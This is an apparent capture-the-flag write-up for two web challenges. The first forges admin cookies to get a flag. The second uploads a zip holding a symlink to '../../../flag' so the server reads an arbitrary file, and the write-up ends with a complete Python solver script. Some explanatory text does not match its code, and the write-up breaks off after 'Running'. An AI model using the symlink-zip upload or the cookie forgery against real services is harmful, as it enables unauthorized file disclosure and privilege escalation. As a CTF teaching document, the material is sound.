We can send an HTTP GET request using the cURL utility to the address [http://52.59.124.14:10014](http://52.59.124.14:10014), including a cookie in the request header.

```python3
import requests

url = 'http://52.59.124.14:10014'
cookies = {'role': 'admin', 'really': 'yes'}
resp = requests.get(url, cookies=cookies)

print(resp.content.decode())
```

The -b argument is used to specify the cookie that will be included in the request header. The value of the cookie is `role=admin; really=yes`. This cookie can be used by the server for authentication or other settings.

In this case, the request is targeted to a web service that requires authorization at the 'admin' level and requests confirmation from the user ('really=yes').

Or use this simple payloads

```bash
$ curl -b "role=admin; really=yes" http://52.59.124.14:10014

Usage: Look at the code ;-)

Overwriting cookies with default value! This must be secure!
Prepared request cookies are: [('really', 'yes'), ('role', 'guest')]
Sending request...
Request cookies are: [('really', 'yes'), ('role', 'guest')]

Response is: Admin: ENO{R3Qu3sts_4r3_s0m3T1m3s_we1rd_dont_get_confused}

Create a txt file `coba.txt` that has text `../../../flag` indicate as the path. The soft link will refer to the original file, so changes made to the original file will also be visible in the symlink.

```bash
$ ln -sfn ../../../flag coba.txt
```

The `coba.txt` file will be blank and it turn into a symlink

<details open>
<summary>coba.txt</summary>
<pre>

</pre>
</details>

Then zip into file named `test.zip` that contains the file `coba.txt`. The --symlink argument in this command indicates that the soft link coba.txt will be included in the zip file. Send the test.zip file to the server using the POST method with the help of the curl library.

```bash
$ zip test.zip coba.txt --symlink
```

Make an HTTP GET request to the server `https://52.59.124.14:10016` to access the file `coba.txt` located in the directory. In the HTTP request header, the -v argument in the curl command indicates that the displayed output will include verbose information about the HTTP request process. Therefore, in addition to the contents of the coba.txt file, the output of the curl command will display information such as status code, header, and server response time.

Final script solver

```python3
import os
import requests

os.system('ln -sfn ../../../flag coba.txt')
os.system('zip test.zip coba.txt --symlink')

files = {'file': ('test.zip', open('test.zip', 'rb'), 'application/zip')}
response = requests.post('http://52.59.124.14:10015/', files=files)

print(response.text)

if "coba.txt" in response.text:
    filepath = response.text.strip()
    filepath_parts = filepath.split("/")
    directory = filepath_parts[-2]
    url = f"http://52.59.124.14:10016/{directory}/coba.txt"
    os.system(f"curl -v {url}")
```

Running

```bash
$ python3 solver.py
